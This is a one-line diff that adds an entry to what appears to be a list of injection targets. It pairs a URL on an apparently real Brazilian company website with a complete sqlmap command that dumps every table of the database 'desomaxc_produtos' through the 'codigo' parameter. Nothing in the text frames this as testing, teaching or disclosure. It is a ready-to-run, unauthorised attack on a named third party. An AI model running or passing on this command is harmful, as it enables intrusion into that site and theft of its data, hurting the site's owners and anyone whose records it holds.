@@ -1,0 +1,1 @@
+https://www.desomax.com.br/promocao-detalhes.php?codigo=43 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u https://www.desomax.com.br/promocao-detalhes.php?codigo=43 -D desomaxc_produtos --dump-all
